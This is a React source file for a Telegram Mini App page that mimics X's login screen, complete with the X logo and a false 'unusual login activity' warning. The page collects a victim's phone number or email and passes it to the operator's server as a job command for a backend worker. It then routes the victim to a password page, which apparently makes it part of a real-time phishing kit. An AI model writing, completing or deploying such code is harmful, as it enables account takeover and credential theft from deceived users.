// src/pages/AlternativeIdentifier.tsx
import { useState } from "react";
import axios from "axios";
import { useSignal, initData } from "@tma.js/sdk-react";
import { useNavigate } from "react-router-dom";
import "./AlternativeIdentifier.css";

import type {
  JobsStatusResponse,
  JobCommandResponse,
} from "../../../server/src/types/jobs";

import { FullScreenLoader } from "../components/FullScreenLoader";
import { Toast } from "../components/Toast";
import { API_BASE } from "../config/api";

export const AlternativeIdentifier = () => {
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [toast, setToast] = useState("");

  const initDataRaw = useSignal(initData.raw);
  const navigate = useNavigate();

  const pollCommandUntilDone = async (commandId: string, maxMs = 20000) => {
    const start = Date.now();

    while (Date.now() - start < maxMs) {
      const resp = await axios.post<JobsStatusResponse>(
        `${API_BASE}/jobs/status`,
        { initData: initDataRaw },
        { headers: { "Content-Type": "application/json" } }
      );

      const cs = resp.data.commandState;

      // 1) Pas de commandState → attendre
      if (!cs) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      // 2) CommandState d'une autre commande → ignorer et attendre
      if (cs.commandId !== commandId) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      // 3) Bonne commande mais pas finie → attendre
      if (cs.status === "pending" || cs.status === "running") {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      // 4) done / error pour la bonne commande
      return cs;
    }

    return null;
  };

  const handleNext = async () => {
    setToast("");

    if (!initDataRaw) {
      setToast("Telegram initData missing");
      return;
    }

    const identifier = input.trim();
    if (!identifier) {
      setToast(
        "Please enter your phone number or email address"
      );
      return;
    }

    try {
      setLoading(true);

      const cmdResp = await axios.post<JobCommandResponse>(
        `${API_BASE}/jobs/command`,
        {
          initData: initDataRaw,
          command: {
            type: "enter-alternate-identifier",
            payload: { identifier },
          },
        },
        { headers: { "Content-Type": "application/json" } }
      );

      if (!cmdResp.data.ok) {
        setLoading(false);
        setToast(cmdResp.data.error || "Command failed");
        return;
      }

      const commandId = cmdResp.data.commandId;
      if (!commandId) {
        setLoading(false);
        setToast("Missing commandId from server");
        return;
      }

      // ✅ Poll jusqu'à résultat worker POUR CETTE COMMANDE
      const finalState = await pollCommandUntilDone(commandId);

      setLoading(false);

      if (!finalState) {
        setToast("Timeout, please try again");
        return;
      }

      if (finalState.status === "done" && finalState.result?.ok) {
        // ✅ identifier OK → go password
        navigate("/password", { state: { username: identifier } });
        return;
      }

      // ❌ erreur identifier
      const msg =
        finalState.error ||
        finalState.result?.message ||
        "Invalid identifier";
      setToast(msg);
    } catch (err: any) {
      setLoading(false);
      setToast(err.response?.data?.error || err.message || "Network error");
    }
  };

  return (
    <div className="alternative-identifier-page">
      <FullScreenLoader visible={loading} text="Checking..." />
      <Toast message={toast} onClose={() => setToast("")} />

      <div
        className="alternative-identifier-modal"
        role="dialog"
        aria-modal="true"
      >
        {/* Header */}
        <div className="alternative-identifier-header">
          <div className="alternative-identifier-header-content">
            <div className="alternative-identifier-close-button-container">
              <button
                className="alternative-identifier-close-button"
                aria-label="Close"
                type="button"
                onClick={() => navigate(-1)}
              >
                <svg
                  viewBox="0 0 24 24"
                  aria-hidden="true"
                  className="alternative-identifier-close-icon"
                >
                  <g>
                    <path d="M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z"></path>
                  </g>
                </svg>
              </button>
            </div>
            <div className="alternative-identifier-logo-container">
              <svg
                viewBox="0 0 24 24"
                aria-label="X"
                role="img"
                className="alternative-identifier-logo"
              >
                <g>
                  <path d="M21.742 21.75l-7.563-11.179 7.056-8.321h-2.456l-5.691 6.714-4.54-6.714H2.359l7.29 10.776L2.25 21.75h2.456l6.035-7.118 4.818 7.118h6.191-.008zM7.739 3.818L18.81 20.182h-2.447L5.29 3.818h2.447z"></path>
                </g>
              </svg>
            </div>
            <div className="alternative-identifier-header-spacer"></div>
          </div>
        </div>

        {/* Content */}
        <div className="alternative-identifier-content">
          <div className="alternative-identifier-title-container">
            <h1 className="alternative-identifier-title" id="modal-header">
              Enter your phone number or email address
            </h1>
            <div className="alternative-identifier-description">
              <span>
                There has been unusual login activity on your account. To help
                protect your account, please enter your phone number (start
                with the country code, e.g. +33) or your email address to verify
                it's you.
              </span>
            </div>
          </div>

          <div className="alternative-identifier-form">
            <label className="alternative-identifier-label">
              <div className="alternative-identifier-label-text">
                <span>Phone or email</span>
              </div>
              <div className="alternative-identifier-input-wrapper">
                <input
                  type="text"
                  name="text"
                  autoComplete="on"
                  autoCapitalize="none"
                  autoCorrect="off"
                  inputMode="text"
                  spellCheck="false"
                  dir="auto"
                  className="alternative-identifier-input"
                  value={input}
                  onChange={(e) => setInput(e.target.value)}
                  disabled={loading}
                  onKeyDown={(e) => {
                    if (e.key === "Enter" && !loading && input.trim()) {
                      handleNext();
                    }
                  }}
                />
              </div>
            </label>

            <button
              className="alternative-identifier-next-button"
              onClick={handleNext}
              disabled={loading || !input.trim()}
              type="button"
            >
              <span>Next</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};
